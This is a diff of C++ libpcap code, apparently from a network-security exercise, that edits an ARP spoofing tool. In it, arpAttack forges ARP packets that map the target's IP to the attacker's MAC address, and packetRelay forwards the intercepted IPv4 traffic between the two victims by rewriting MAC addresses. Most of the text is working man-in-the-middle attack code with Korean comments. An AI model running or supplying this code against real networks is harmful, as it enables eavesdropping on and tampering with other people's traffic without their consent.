@@ -43,72 +43,86 @@ struct EthIpPacket final{
 
 void arpAttack(pcap_t *handle, Mac my_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
 {
-        EthArpPacket packet;
+    EthArpPacket packet;
 
-        packet.eth_.dmac_ = sender_mac;
-        packet.eth_.smac_ = my_mac;
-        packet.eth_.type_ = htons(EthHdr::Arp);
+    packet.eth_.dmac_ = sender_mac;
+    packet.eth_.smac_ = my_mac;
+    packet.eth_.type_ = htons(EthHdr::Arp);
 
-        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-        packet.arp_.pro_ = htons(EthHdr::Ip4);
-        packet.arp_.hln_ = Mac::SIZE;
-        packet.arp_.pln_ = Ip::SIZE;
-        packet.arp_.op_ = htons(ArpHdr::Reply);
-        packet.arp_.smac_ = my_mac;
-        packet.arp_.sip_ = htonl(Ip(target_ip));
-        packet.arp_.tmac_ = sender_mac;
-        packet.arp_.tip_ = htonl(Ip(sender_ip));
+    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+    packet.arp_.pro_ = htons(EthHdr::Ip4);
+    packet.arp_.hln_ = Mac::SIZE;
+    packet.arp_.pln_ = Ip::SIZE;
+    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.smac_ = my_mac;
+    packet.arp_.sip_ = htonl(Ip(target_ip));
+    packet.arp_.tmac_ = sender_mac;
+    packet.arp_.tip_ = htonl(Ip(sender_ip));
 
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-        if (res != 0) {
-                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        }
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
 }
 
-
-void packetRelay(pcap_t *handle,Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
+void packetRelay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip)
 {
-        struct pcap_pkthdr *header;
-        const u_char *response;
-        while (true) {
-                int pcap_next_res = pcap_next_ex(handle, &header, &response);
+    struct pcap_pkthdr *header;
+    const u_char *response;
     
-                if (pcap_next_res == 1) {
-                        EthIpPacket *recv_packet = (EthIpPacket *)response; 
-			
-     
-                if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 && 
-                        recv_packet->eth_.smac_ == sender_mac && recv_packet->eth_.dmac_ == my_mac) {
-            		printf("I got sender's packet\n");
-                        recv_packet->eth_.smac_ = my_mac;
-                        recv_packet->eth_.dmac_ = target_mac;  
-                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
-                if (res != 0) {
-                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-                 }
-                }
-		if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4 &&
-                     recv_packet->eth_.smac_ == target_mac &&
-                     recv_packet->eth_.dmac_ == my_mac) {
-			printf("I got target's packet\n");
-                	recv_packet->eth_.smac_ = my_mac;
-                	recv_packet->eth_.dmac_ = sender_mac;
+    // Convert sender_ip and target_ip to Ip objects
+    Ip senderIp(sender_ip);
+    Ip targetIp(target_ip);
 
-                int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
-                if (res != 0) {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    // 패킷 검사
+    while (true) {
+        int pcap_next_res = pcap_next_ex(handle, &header, &response);
+        if (pcap_next_res == 1) {
+            EthIpPacket *recv_packet = (EthIpPacket *)response;
+            
+            // 받은 패킷이 IPv4 패킷인지 확인
+            if (ntohs(recv_packet->eth_.type_) == EthHdr::Ip4) {
+                // 수신된 패킷의 출발지 IP를 Ip 객체로 변환
+                Ip srcIp = ntohl(recv_packet->ip_.src_ip_);
+                
+                // IP 주소가 senderIp 또는 targetIp와 일치하는지 확인
+                if (srcIp == senderIp) {
+                    fprintf(stderr,"I got spoofed packet\n");
+
+                    // 출발지, 목적지 MAC 주소 변경
+                    recv_packet->eth_.smac_ = my_mac;  // Mac 타입의 smac_에 my_mac 할당
+                    recv_packet->eth_.dmac_ = target_mac;
+
+                    // 수정된 패킷 전송
+                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
+                    if (res != 0) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                    }
+                }
+
+                else if (srcIp == targetIp) {
+                    fprintf(stderr,"I got spoofed packet\n");
+
+                    // 출발지, 목적지 MAC 주소 변경
+                    recv_packet->eth_.smac_ = my_mac;  // Mac 타입의 smac_에 my_mac 할당
+                    recv_packet->eth_.dmac_ = sender_mac;
+
+                    // 수정된 패킷 전송
+                    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(recv_packet), header->len);
+                    if (res != 0) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                    }
                 }
             }
-
-                } 
-                else if (pcap_next_res == -1 || pcap_next_res == -2) {
-                printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle)); 
-                }
-
-		
-
-                }
+        } 
+        else if (pcap_next_res == -1 || pcap_next_res == -2) {
+            printf("Error or Timeout reading the response: %s\n", pcap_geterr(handle));
+        }
+    }
 }
+
+
+
 
 /*  
 void packet_relay(pcap_t *handle, Mac my_mac, Mac target_mac, Mac sender_mac, const char* sender_ip, const char* target_ip) {
